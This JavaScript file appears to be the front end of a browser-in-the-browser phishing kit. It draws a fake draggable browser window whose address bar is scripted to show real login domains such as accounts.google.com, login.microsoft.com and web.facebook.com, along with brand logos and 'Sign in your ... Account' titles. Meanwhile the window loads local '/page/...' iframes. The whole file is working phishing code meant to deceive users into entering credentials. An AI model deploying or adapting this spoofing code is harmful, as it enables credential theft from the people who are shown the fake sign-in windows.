var minimize = document.getElementById("minimize");
var square = document.getElementById("square");
var exit = document.getElementById("exit");
var titleBar = document.getElementById("title-bar");

////////////////// Hover listeners //////////////////
minimize.addEventListener('mouseover', function handleMouseOver() {
  minimize.style.backgroundColor = '#272727';
  minimize.style.cursor = 'context-menu';
});

minimize.addEventListener('mouseout', function handleMouseOut() {
  minimize.style.backgroundColor = 'black';
  minimize.style.cursor = 'default';
});

square.addEventListener('mouseover', function handleMouseOver() {
  square.style.backgroundColor = '#272727';
  square.style.cursor = 'context-menu';
});

square.addEventListener('mouseout', function handleMouseOut() {
  square.style.backgroundColor = 'black';
  square.style.cursor = 'default';
});

exit.addEventListener('mouseover', function handleMouseOver() {
  exit.style.backgroundColor = 'red';
  exit.style.cursor = 'context-menu';
});

exit.addEventListener('mouseout', function handleMouseOut() {
  exit.style.backgroundColor = 'black';
  exit.style.cursor = 'default';
});

titleBar.addEventListener('mouseover', function handleMouseOver() {
  titleBar.style.cursor = 'context-menu';
});

titleBar.addEventListener('mouseout', function handleMouseOver() {
  titleBar.style.cursor = 'default';
});


//////////////// Make window draggable start ////////////////
// Make the DIV element draggable:
var draggable = $('#window');
var title = $('#title-bar');

title.on('mousedown', function(e){
	var dr = $(draggable).addClass("drag");
	height = dr.outerHeight();
	width = dr.outerWidth();
	ypos = dr.offset().top + height - e.pageY,
	xpos = dr.offset().left + width - e.pageX;
	$(document.body).on('mousemove', function(e){
		var itop = e.pageY + ypos - height;
		var ileft = e.pageX + xpos - width;
		if(dr.hasClass("drag")){
			dr.offset({top: itop,left: ileft});
		}
	}).on('mouseup', function(e){
			dr.removeClass("drag");
	});
});
//////////////// Make window draggable end ////////////////
function closeIFrame(){
  $("#window").fadeOut(200);
  window.location.href="http://127.0.0.1/page";
  // $("#window").css("display", "none");
}

////////////////// Onclick listeners //////////////////
// X button functionality
$("#exit").click(function(){
    $("#window").css("display", "none");
  });

// Maximize button functionality
$("#square").click(enlarge);

function enlarge(){
  if(square.classList.contains("enlarged")){
    $("#window").css("width", "40%");
    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
    $("#content").css("width", "100%");
    $("#square").removeClass("enlarged");
  }
  else{
    $("#window").css("width", "70%");
    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
    $("#content").css("width", "100%");
    $("#square").addClass("enlarged");
  }
}


// function setIframeSource
function setIframeSource(url) {
  $("#window").fadeIn(2000);
  // get element with id content
    let content = document.getElementById("content");
    
    // set source of iframe to the url of the content
    content.src = url;
}

/// set url 
function SeturlSource(url) {

  let domain = document.getElementById("domain-name");
  domain.innerHTML = url;

}

function SetImageSrc(url) {
  let image = document.getElementById("logo");
  image.src = url;
}

function SeturlTitle(url) {
  let domain = document.getElementById("logo-description")
  domain.innerText = url;
}

//// Pop-up appear on click with delay ////
$("#clickme").click(function(){
  setIframeSource("/page")
  SeturlSource("https://twitter.com/")
});

//// Pop-up appear on click with delay ////
$("#clickme1").click(function(){
  setIframeSource("/page/facebook");
  SeturlSource("web.facebook.com/");
  SeturlTitle("Sign in your Facebook Account");
  SetImageSrc("Windows-DarkMode-Delay/index.png");
});

//// Pop-up appear on click with delay ////
$("#clickme2").click(function(){
  setIframeSource("/page/gmail");
  SeturlSource("accounts.google.com/");
  SeturlTitle("Sign in your Gmail Account");
  SetImageSrc("Windows-DarkMode-Delay/Google_'G'_Logo.svg.png");
});

//// Pop-up appear on click with delay ////
$("#clickme3").click(function(){
  setIframeSource("/page/microsoft")
  SeturlSource("login.microsoft.com/")
  SeturlTitle("Sign in your Microsoft Account");
  SetImageSrc("Windows-DarkMode-Delay/microsoft.png");
});

$("#clickme4").click(function(){
  setIframeSource("/page/yahoo")
  SeturlSource("login.yahoo.com/")
  SeturlTitle("Sign in your Yahoo Account");
  SetImageSrc("Windows-DarkMode-Delay/Yahoo.png");
});
$("#clickme5").click(function(){
  setIframeSource("/page/aol");
  SeturlSource("login.aol.com/");
  SeturlTitle("Sign in your Aol Account");
  SetImageSrc("Windows-DarkMode-Delay/apple-1.png");
});

